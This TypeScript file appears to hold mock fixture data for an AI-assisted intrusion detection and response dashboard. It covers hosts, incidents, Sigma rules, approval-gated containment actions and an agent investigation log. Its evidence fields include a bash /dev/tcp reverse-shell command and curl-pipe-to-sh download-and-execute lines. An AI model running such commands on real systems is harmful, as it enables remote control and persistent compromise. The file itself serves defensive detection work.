import type {
  ActionRow, AgentTurn, AiReview, Anomaly, AuditEntry, Host, Incident, PolicyBody, PolicyRow, Rule, Severity,
} from "../api/types";

const now = Date.now();
export const t = (minAgo: number): string => new Date(now - minAgo * 60_000).toISOString();

export const HOSTS: Host[] = [
  { id: "h-web01-0000-4000-8000-000000000001", hostname: "web-01", os: "Ubuntu 22.04", arch: "amd64", kernel: "5.15.0-105", agent_version: "0.3.2", policy_version: 4, autonomy: null, status: "ok",
    stats: { events_per_min: 1840, anomalies_per_min: 2.1, rules_loaded: 312, buffer_events: 40211, uptime_s: 864000, ws_connected: true }, rule_errors: [], enrolled_at: t(60 * 24 * 20), last_seen: t(0.2), open_incidents: 2 },
  { id: "h-db01-00000-4000-8000-000000000002", hostname: "db-01", os: "Debian 12", arch: "amd64", kernel: "6.1.0-18", agent_version: "0.3.2", policy_version: 2, autonomy: "propose_only", status: "degraded",
    stats: { events_per_min: 620, anomalies_per_min: 0.4, rules_loaded: 310, buffer_events: 12004, uptime_s: 450000, ws_connected: true },
    rule_errors: [{ rule_id: "6f1b9a1c-3d2e-4f7a-9c11-aa0000000009", error: "unsupported modifier |fieldref on field ParentImage" }], enrolled_at: t(60 * 24 * 20), last_seen: t(0.5), open_incidents: 1 },
  { id: "h-build02-000-4000-8000-000000000003", hostname: "build-02", os: "Ubuntu 24.04", arch: "arm64", kernel: "6.8.0-31", agent_version: "0.3.1", policy_version: 3, autonomy: null, status: "ok",
    stats: { events_per_min: 90, anomalies_per_min: 0, rules_loaded: 312, buffer_events: 2100, uptime_s: 1200, ws_connected: false }, rule_errors: [], enrolled_at: t(60 * 24 * 9), last_seen: t(14), open_incidents: 0 },
];
const [WEB, DB] = HOSTS.map((h) => h.id);

const CRON_INC = "inc-cron-persist-0000-4000-8000-000000000005";
const RS_INC = "inc-reverse-shell-0000-4000-8000-000000000001";
const mkA = (id: string, host: string, inc: string | null, min: number, rule: string, title: string, src: Anomaly["rule_source"], sev: Severity, summary: string, tags: string[], evidence: Record<string, unknown> | null, r2?: string): Anomaly => ({
  id, host_id: host, incident_id: inc, ts: t(min), rule_id: rule, rule_source: src, rule_title: title, category: "process", severity: sev, fingerprint: `${id}${"ab".repeat(30)}`.slice(0, 64),
  summary, attack_tags: tags, falsepositives: ["Administrative scripts"], shadow: 0, evidence, evidence_r2_key: r2 ?? null, received_at: t(min - 0.05),
});

export const ANOMALIES: Anomaly[] = [
  mkA("an-1", WEB, RS_INC, 42, "8a2e3c10-0000-4000-8000-0000000000a1", "Linux Reverse Shell via Bash /dev/tcp", "sigma", "high", "bash spawned by nginx opened /dev/tcp/203.0.113.66/4444", ["attack.execution", "attack.t1059.004"],
    { pid: 28113, ppid: 1177, image: "/bin/bash", user: "www-data", cmdline: "bash -c 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1'", parent_image: "/usr/sbin/nginx" }),
  mkA("an-2", WEB, RS_INC, 41, "native:outbound_rare_port", "Outbound connection to rare port", "native", "medium", "www-data connected to 203.0.113.66:4444 (first time seen)", ["attack.command-and-control", "attack.t1571"],
    { dst_ip: "203.0.113.66", dst_port: 4444, pid: 28113, proto: "tcp" }, "evidence/an-2.json"),
  mkA("an-3", WEB, RS_INC, 38, "8a2e3c10-0000-4000-8000-0000000000a2", "Download and Execute via curl pipe sh", "sigma", "high", "curl http://203.0.113.66/x.sh | sh from www-data shell", ["attack.execution", "attack.t1105"],
    { pid: 28190, image: "/usr/bin/curl", cmdline: "curl -s http://203.0.113.66/x.sh", user: "www-data" }),
  mkA("an-4", WEB, RS_INC, 35, "native:new_cron", "New cron entry created", "native", "medium", "/etc/cron.d/.sysupd created by www-data process", ["attack.persistence", "attack.t1053.003"],
    { path: "/etc/cron.d/.sysupd", sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" }),
  mkA("an-5", DB, "inc-ssh-bf-0000-4000-8000-000000000002", 190, "native:ssh_bruteforce", "SSH brute force", "native", "medium", "58 failed SSH logins from 198.51.100.23 in 60s", ["attack.credential-access", "attack.t1110.001"], { src_ip: "198.51.100.23", count: 58, window_s: 60, users: ["root", "admin", "postgres"] }),
  mkA("an-6", WEB, "inc-baseline-0000-4000-8000-000000000003", 300, "baseline:conn_rate", "Connection rate anomaly", "baseline", "low", "outbound connection rate z=5.2 above baseline", ["attack.exfiltration"], { zscore: 5.2, rate: 340 }),
  mkA("an-7", WEB, null, 12, "native:ssh_bruteforce", "SSH brute force", "native", "low", "12 failed logins from 192.0.2.4", ["attack.t1110"], { src_ip: "192.0.2.4", count: 12 }),
];

export const INCIDENTS: Incident[] = [
  { id: RS_INC, host_id: WEB, title: "Reverse shell from nginx worker on web-01", status: "awaiting_approval", verdict: "malicious", severity: "critical", confidence: 0.93,
    attack_tags: ["attack.execution", "attack.t1059.004", "attack.t1105", "attack.t1053.003"], workflow_id: "wf-1", analyst_note: null, closed_at: null, created_at: t(42), updated_at: t(30),
    ai_summary: "A shell spawned by the nginx worker (www-data) opened a reverse connection to 203.0.113.66:4444, downloaded a script via curl|sh and installed a cron persistence entry. Consistent with web-app RCE followed by hands-on-keyboard activity. Containment proposed: kill the shell (PID 28113) and block the C2 IP; both require approval." },
  { id: "inc-ssh-bf-0000-4000-8000-000000000002", host_id: DB, title: "SSH brute force against db-01", status: "contained", verdict: "suspicious", severity: "medium", confidence: 0.71, attack_tags: ["attack.credential-access", "attack.t1110.001"],
    ai_summary: "High-rate failed SSH logins from a single external IP; no successful login observed. Source IP was blocked.", analyst_note: null, workflow_id: "wf-2", closed_at: null, created_at: t(190), updated_at: t(170) },
  { id: "inc-baseline-0000-4000-8000-000000000003", host_id: WEB, title: "Unusual outbound connection rate on web-01", status: "closed_benign", verdict: "false_positive", severity: "low", confidence: 0.84, attack_tags: ["attack.exfiltration"],
    ai_summary: "Rate spike coincides with a scheduled backup job.", analyst_note: "Nightly backup, confirmed with ops.", workflow_id: null, closed_at: t(280), created_at: t(300), updated_at: t(280) },
  { id: "inc-pkg-0000-4000-8000-000000000004", host_id: DB, title: "Unexpected package manager execution", status: "investigating", verdict: null, severity: "info", confidence: null, attack_tags: [], ai_summary: null, analyst_note: null, workflow_id: "wf-4", closed_at: null, created_at: t(8), updated_at: t(7) },
];

INCIDENTS.push({ id: CRON_INC, host_id: DB, title: "Root cron persistence on db-01", status: "resolved", verdict: "malicious", severity: "high", confidence: 0.91,
  attack_tags: ["attack.persistence", "attack.t1053.003"], workflow_id: "wf-5", analyst_note: null, closed_at: null, created_at: t(240), updated_at: t(205),
  ai_summary: "A hidden cron file in /etc/cron.d ran a remote script every minute as root. The file was quarantined after approval and the AI re-checked the host." });
ANOMALIES.push(mkA("an-8", DB, CRON_INC, 240, "native:new_cron", "New cron entry created", "native", "high", "/etc/cron.d/.sysupd created by a non-root process", ["attack.persistence", "attack.t1053.003"], { path: "/etc/cron.d/.sysupd", sha256: "9b1f4c0de27a" }));

export const REVIEWS: AiReview[] = [
  { id: "rv-1", incident_id: RS_INC, step: "triage", round: 0, model: "@cf/meta/llama-3.3-70b", prompt_hash: "9f2c", ts: t(41.5),
    output: { verdict: "suspicious", severity: "high", confidence: 0.62, rationale: "bash with /dev/tcp redirect spawned from nginx is a classic reverse shell pattern, but I need the process tree and live connections before concluding.",
      requests: [{ action: "collect_evidence", params: { kind: "process_tree", target: "28113" } }, { action: "collect_evidence", params: { kind: "netconns" } }] },
    gate: [{ action: "collect_evidence", tier: 0, accepted: true, reason: "tier 0 allowed under autonomous mode" }, { action: "collect_evidence", tier: 0, accepted: true, reason: "tier 0 allowed under autonomous mode" }] },
  { id: "rv-2", incident_id: RS_INC, step: "reanalyze", round: 1, model: "@cf/meta/llama-3.3-70b", prompt_hash: "a771", ts: t(39),
    output: { verdict: "malicious", severity: "high", confidence: 0.84, rationale: "Process tree confirms nginx -> bash -> bash -i. Established TCP connection to 203.0.113.66:4444, an IP with no prior history on this fleet. Checking for further payload staging.",
      requests: [{ action: "collect_evidence", params: { kind: "log_excerpt", target: "/var/log/nginx/access.log" } }, { action: "raise_log_level", params: { ttl_seconds: 7200 } }, { action: "disable_user", params: { username: "root" } }] },
    gate: [{ action: "collect_evidence", tier: 0, accepted: true, reason: "ok" }, { action: "raise_log_level", tier: 0, accepted: true, reason: "ttl within 86400" }, { action: "disable_user", tier: 1, accepted: false, reason: "never disable root / uid 0" }] },
  { id: "rv-3", incident_id: RS_INC, step: "reanalyze", round: 2, model: "@cf/meta/llama-3.3-70b", prompt_hash: "b012", ts: t(34),
    output: { verdict: "malicious", severity: "critical", confidence: 0.93, rationale: "Access log shows a crafted POST to /upload.php 2 minutes before the shell; curl|sh fetched x.sh and a hidden cron job was written for persistence. Active attacker with a live C2 channel.",
      requests: [{ action: "kill_process", params: { pid: 28113 } }, { action: "block_ip", params: { ip: "203.0.113.66", ttl_seconds: 86400 } }, { action: "isolate_host", params: { ttl_seconds: 3600 } }] },
    gate: [{ action: "kill_process", tier: 1, accepted: true, reason: "tier 1: queued for human approval" }, { action: "block_ip", tier: 1, accepted: true, reason: "tier 1: queued for human approval" }, { action: "isolate_host", tier: 1, accepted: false, reason: "isolation not justified while kill+block available (policy: least disruptive)" }] },
  { id: "rv-4", incident_id: RS_INC, step: "final", round: 3, model: "@cf/meta/llama-3.3-70b", prompt_hash: "c3d4", ts: t(30),
    output: { verdict: "malicious", severity: "critical", confidence: 0.93, rationale: "Awaiting human approval of containment actions.", requests: [] }, gate: [] },
];

REVIEWS.push({ id: "rv-5", incident_id: CRON_INC, step: "final", round: 1, model: "@cf/meta/llama-3.3-70b", prompt_hash: "d5e6", ts: t(205),
  output: Object.assign({ verdict: "malicious" as const, severity: "high" as const, confidence: 0.91, rationale: "Investigation finished.", requests: [] },
    { verification: "After quarantine, /etc/cron.d no longer contains .sysupd, no cron-spawned curl processes are running, and no outbound connections to 198.51.100.9 remain." }), gate: [] });

const act = (o: Partial<ActionRow> & Pick<ActionRow, "id" | "host_id" | "action" | "params" | "state">): ActionRow => ({
  incident_id: null, tier: 0, kind: "command", proposed_by: "ai", rationale: null, approved_by: null, reject_reason: null, result: null, error: null, rollback_token: null, rollback_of: null,
  expires_at: null, created_at: t(30), updated_at: t(30), ...o,
});
export const ACTIONS: ActionRow[] = [
  act({ id: "ac-1", incident_id: RS_INC, host_id: WEB, action: "collect_evidence", params: { kind: "process_tree", target: "28113" }, state: "succeeded", created_at: t(41), result: { data: "nginx(1177)---bash(28113)---bash(28120)" } }),
  act({ id: "ac-2", incident_id: RS_INC, host_id: WEB, action: "raise_log_level", params: { ttl_seconds: 7200 }, state: "succeeded", created_at: t(38) }),
  act({ id: "ac-3", incident_id: RS_INC, host_id: WEB, action: "kill_process", params: { pid: 28113, start_time: "2026-11-12T09:14:22Z" }, tier: 1, state: "proposed", created_at: t(30),
    rationale: "Terminates the interactive reverse shell (PID 28113) spawned by nginx. Stops attacker command execution immediately; the nginx master is unaffected.", expires_at: t(-60),
    critic: { decision: "submit", round: 1, concerns: ["PID 28113 may have exited before the kill lands; the start_time guard will make it a no-op rather than hit a reused PID."], missing_checks: ["Confirm the nginx master process is not the parent of 28113"] } }),
  act({ id: "ac-4", incident_id: RS_INC, host_id: WEB, action: "block_ip", params: { ip: "203.0.113.66", ttl_seconds: 86400 }, tier: 1, state: "proposed", created_at: t(30),
    rationale: "Blocks the C2 endpoint 203.0.113.66 (no prior history in fleet). Prevents re-connection and payload staging. Reversible via rollback.", expires_at: t(-60) }),
  act({ id: "ac-6", incident_id: CRON_INC, host_id: DB, action: "collect_evidence", params: { kind: "file_sample", target: "/etc/cron.d/*" }, state: "succeeded", created_at: t(228), result: { data: "* * * * * root curl -s http://198.51.100.9/u | sh" } }),
  act({ id: "ac-7", incident_id: CRON_INC, host_id: DB, action: "quarantine_file", params: { path: "/etc/cron.d/.sysupd", sha256: "9b1f4c0de27a" }, tier: 1, state: "succeeded", created_at: t(224), approved_by: "dev@local", rollback_token: "rb-q1",
    rationale: "Hidden cron file runs a remote script every minute as root. Quarantining removes persistence without touching other cron entries.", result: {},
    critic: { decision: "submit", round: 2, concerns: [], missing_checks: [] } }),
  act({ id: "ac-5", incident_id: "inc-ssh-bf-0000-4000-8000-000000000002", host_id: DB, action: "block_ip", params: { ip: "198.51.100.23", ttl_seconds: 3600 }, tier: 1, state: "succeeded", created_at: t(180), approved_by: "dev@local", rationale: "Brute-force source.", rollback_token: "rb-7d1c9a", result: {} }),
];

export const AUDIT: AuditEntry[] = (() => {
  const base: Omit<AuditEntry, "id">[] = [
    { ts: t(300), actor: "agent:web-01", event: "anomaly.ingested", incident_id: null, host_id: WEB, action_id: null, detail: { count: 1 } },
    { ts: t(190), actor: "system", event: "incident.created", incident_id: "inc-ssh-bf-0000-4000-8000-000000000002", host_id: DB, action_id: null, detail: { severity: "medium" } },
    { ts: t(181), actor: "ai", event: "action.proposed", incident_id: "inc-ssh-bf-0000-4000-8000-000000000002", host_id: DB, action_id: "ac-5", detail: { action: "block_ip", tier: 1 } },
    { ts: t(180), actor: "human:dev@local", event: "action.approved", incident_id: "inc-ssh-bf-0000-4000-8000-000000000002", host_id: DB, action_id: "ac-5", detail: { ttl_seconds: 3600 } },
    { ts: t(42), actor: "system", event: "incident.created", incident_id: RS_INC, host_id: WEB, action_id: null, detail: { severity: "high" } },
    { ts: t(41.5), actor: "ai", event: "ai.review", incident_id: RS_INC, host_id: WEB, action_id: null, detail: { step: "triage", confidence: 0.62 } },
    { ts: t(38), actor: "ai", event: "gate.rejected", incident_id: RS_INC, host_id: WEB, action_id: null, detail: { action: "disable_user", reason: "never disable root / uid 0" } },
    { ts: t(30), actor: "ai", event: "action.proposed", incident_id: RS_INC, host_id: WEB, action_id: "ac-3", detail: { action: "kill_process", tier: 1 } },
    { ts: t(30), actor: "ai", event: "action.proposed", incident_id: RS_INC, host_id: WEB, action_id: "ac-4", detail: { action: "block_ip", tier: 1 } },
  ];
  const out = base.map((b, i) => ({ ...b, id: i + 1 }));
  for (let i = 0; i < 70; i++) out.push({ id: 10 + i, ts: t(400 + i * 7), actor: i % 3 ? `agent:db-01` : "system", event: i % 3 ? "heartbeat.degraded" : "policy.updated", incident_id: null, host_id: DB, action_id: null, detail: { n: i } });
  return out.sort((a, b) => b.id - a.id);
})();

export const POLICY_BODY: PolicyBody = {
  log_level: "info", thresholds: { "native:ssh_bruteforce.count": 10, "native:ssh_bruteforce.window_s": 60, "baseline.zscore": 4 },
  watches: [{ kind: "path", target: "/etc/cron.d" }], suppressions: [], rules: [], iocs: [{ type: "ip", value: "203.0.113.66" }], server_endpoints: ["https://aegis.example.workers.dev"],
};
export const policyHistory = (hostId: string, current: number): PolicyRow[] =>
  Array.from({ length: current }, (_, i) => {
    const v = i + 1;
    const body: PolicyBody = { ...POLICY_BODY, log_level: v === 2 ? "debug" : "info", thresholds: { ...POLICY_BODY.thresholds, "native:ssh_bruteforce.count": v >= 3 ? 8 : 10 }, iocs: POLICY_BODY.iocs.slice(0, v >= 4 ? 1 : 0), watches: v >= 2 ? POLICY_BODY.watches : [] };
    return { host_id: hostId, version: v, body, created_by: v === 1 ? "system" : v === 3 ? "human:dev@local" : "ai", reason: v === 1 ? "initial policy" : v === 3 ? "tighten brute-force threshold" : "AI: add IOC / watch", created_at: t(60 * 24 * (current - v + 1)) };
  });

const rule = (n: number, title: string, level: Severity, status: Rule["status"], tags: string[], hits: number, tp: number, fp: number): Rule => ({
  id: `6f1b9a1c-3d2e-4f7a-9c11-aa00000000${String(n).padStart(2, "0")}`, pack_id: "sigmahq-linux", pack_name: "SigmaHQ Linux", title, level, logsource: "linux/process_creation", attack_tags: tags,
  yaml: `title: ${title}\nid: 6f1b9a1c-3d2e-4f7a-9c11-aa00000000${String(n).padStart(2, "0")}\nstatus: stable\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains: '/dev/tcp/'\n  condition: selection\nlevel: ${level}\ntags:\n${tags.map((x) => `  - ${x}`).join("\n")}\n`,
  status, created_by: "system", hits_total: hits, tp_total: tp, fp_total: fp, shadow_since: status === "shadow" ? t(60 * 30) : null, created_at: t(60 * 24 * 30), updated_at: t(60 * 24),
});
export const RULES: Rule[] = [
  rule(1, "Linux Reverse Shell via Bash /dev/tcp", "high", "active", ["attack.execution", "attack.t1059.004"], 14, 9, 1),
  rule(2, "Download and Execute via curl pipe sh", "high", "active", ["attack.execution", "attack.t1105"], 31, 12, 6),
  rule(3, "Cron Job Creation in /etc/cron.d", "medium", "active", ["attack.persistence", "attack.t1053.003"], 22, 3, 8),
  rule(4, "SSH Authorized Keys Modification", "high", "active", ["attack.persistence", "attack.t1098.004"], 4, 2, 0),
  rule(5, "Sudo Privilege Escalation Attempt", "medium", "shadow", ["attack.privilege-escalation", "attack.t1548.003"], 57, 0, 0),
  rule(6, "Scheduled Task Enumeration", "low", "disabled", ["attack.discovery", "attack.t1053"], 410, 0, 12),
  rule(7, "Clear Command History", "medium", "active", ["attack.defense-evasion", "attack.t1070.003"], 6, 1, 2),
  rule(8, "Credential Dump from /etc/shadow", "critical", "active", ["attack.credential-access", "attack.t1003.008"], 1, 1, 0),
  rule(9, "Network Service Scanning Tool", "low", "shadow", ["attack.discovery", "attack.t1046"], 19, 0, 0),
];

const tc = (id: string, name: string, args: Record<string, unknown>) => ({ id, name, arguments: args });
const turn = (n: number, min: number, role: AgentTurn["role"], content: AgentTurn["content"], tool_name: string | null = null, tool_call_id: string | null = null): AgentTurn =>
  ({ id: `tu-${n}`, incident_id: CRON_INC, run_id: "run-1", seq: n, ts: t(min), role, tool_name, tool_call_id, content });
export const TURNS: AgentTurn[] = [
  turn(1, 239, "user", { text: "New incident on db-01: /etc/cron.d/.sysupd created by a non-root process. Investigate and contain if warranted." }),
  turn(2, 238, "assistant", { text: "A dot-prefixed cron file is suspicious. I'll look at the process tree and the auth log first.", tool_calls: [tc("c1", "collect_evidence", { kind: "process_tree", target: "4417" }), tc("c2", "collect_evidence", { kind: "log_excerpt", target: "/root/.bash_history" })] }),
  turn(3, 237, "tool", { result: { data: "sshd(901)---bash(4402)---sh(4417)---curl(4420)" } }, "collect_evidence", "c1"),
  turn(4, 237, "tool", { error: "path not allowed: /root/.bash_history (log_excerpt is limited to /var/log)" }, "collect_evidence", "c2"),
  turn(5, 235, "assistant", { tool_calls: [tc("c3", "fleet_search", { query: "198.51.100.9", window: "7d" })] }),
  turn(6, 234, "tool", { result: { hosts: 1, matches: 3, first_seen: t(250) } }, "fleet_search", "c3"),
  turn(7, 232, "assistant", { text: "The script host appears only on db-01. Proposing quarantine of the cron file.", tool_calls: [tc("c4", "propose_action", { action: "quarantine_file", params: { path: "/etc/cron.d/.sysupd" }, rationale: "Hidden root cron entry fetching a remote script." })] }),
  turn(8, 231, "tool", { result: { critic: "revise", missing_checks: ["file_sample /etc/cron.d/*"] } }, "propose_action", "c4"),
  turn(9, 230, "assistant", { text: "The reviewer wants to see the rest of cron.d before I act.", tool_calls: [tc("c5", "collect_evidence", { kind: "file_sample", target: "/etc/cron.d/*" })] }),
  turn(10, 228, "tool", { result: { data: "/etc/cron.d/.sysupd: * * * * * root curl -s http://198.51.100.9/u | sh\n/etc/cron.d/logrotate: ordinary" } }, "collect_evidence", "c5"),
  turn(11, 226, "assistant", { tool_calls: [tc("c6", "propose_action", { action: "quarantine_file", params: { path: "/etc/cron.d/.sysupd", sha256: "9b1f4c0de27a" }, rationale: "Only .sysupd is malicious; other cron.d entries are ordinary." })] }),
  turn(12, 225, "tool", { result: { status: "proposed", action_id: "ac-7" } }, "propose_action", "c6"),
  turn(13, 207, "assistant", { text: "Approved and executed. Verifying the host is clean.", tool_calls: [tc("c7", "collect_evidence", { kind: "file_sample", target: "/etc/cron.d/*" }), tc("c8", "collect_evidence", { kind: "netconns" })] }),
  turn(14, 206, "tool", { result: { data: "/etc/cron.d/logrotate: ordinary" } }, "collect_evidence", "c7"),
  turn(15, 206, "tool", { result: { data: "no connections to 198.51.100.9" } }, "collect_evidence", "c8"),
  turn(16, 205, "assistant", { tool_calls: [tc("c9", "finish", { outcome: "verified", summary: "Cron persistence removed; no residual C2 connections." })] }),
  turn(17, 205, "tool", { result: { status: "resolved" } }, "finish", "c9"),
];
